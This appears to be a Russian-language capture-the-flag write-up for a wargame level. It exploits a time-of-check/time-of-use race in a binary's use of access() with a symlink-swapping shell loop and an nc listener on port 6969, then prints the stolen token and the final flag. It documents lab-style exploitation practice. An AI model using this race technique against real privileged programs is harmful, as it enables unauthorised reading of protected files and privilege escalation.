@@ -1,0 +1,86 @@
+1) strings level10
+
+[blalalalalala]
+
+%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 .. 
+Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file .. 
+Damn. Unable to open file
+Unable to read from file: %s
+wrote file!
+
+[blalbalbalbal]
+
+2) Видим что нам необходимо слушать порт 6969
+
+3) Посмотрим какие функции используются в бинарнике (nm level10)
+
+[blalblablab]
+
+0804a04c A _edata
+0804a06c A _end
+08048a1c T _fini
+08048a38 R _fp_hw
+080484d0 T _init
+08048620 T _start
+         U access@@GLIBC_2.0
+0804a064 b completed.6159
+         U connect@@GLIBC_2.0
+0804a044 W data_start
+0804a068 b dtor_idx.6161
+         U exit@@GLIBC_2.0
+         U fflush@@GLIBC_2.0
+080486b0 t frame_dummy
+         U htons@@GLIBC_2.0
+         U inet_addr@@GLIBC_2.0
+080486d4 T main
+
+[blablablabla]
+
+4) Используется access. Из официальной документации:
+
+Использование access для проверки, можно ли пользователю, например, открыть файл перед тем, как действительно выполнить open(2), 
+создает дыру в защите, потому что пользователь может в короткий промежуток между проверкой и открытием файла как-то его изменить. 
+
+5) Чтож попробуем это реализовать
+
+while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+
+Запускаем бесконечнйый цикл, который будет переключаться между level10 и token
+
+6) while true; do ./level10 /tmp/exploit 127.0.0.1; done
+запускаем в бесконечном цикле level10 с нашим exploit
+
+
+7) nc -lk 6969
+И слушаем порт
+
+
+Connecting to %s:6969 .. Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file .. Damn. Unable to open fileUnable to read from file: %s
+wrote file!You don't have access to %s
+0????Lx???p??????????????zR|
+                            P???F
+                                 J
+??                                tx?;*2$"@?????B
+  8`|???a?A
+           ?A?A?N0JA?A
+                      ??A???????????????????
+???o?Ё                                      Є
+?
+ ??H??????o???o?(.*( )*.
+woupa2yuojeeaaed06riuj63c
+
+
+8) su flag10
+woupa2yuojeeaaed06riuj63c
+
+9) getflag
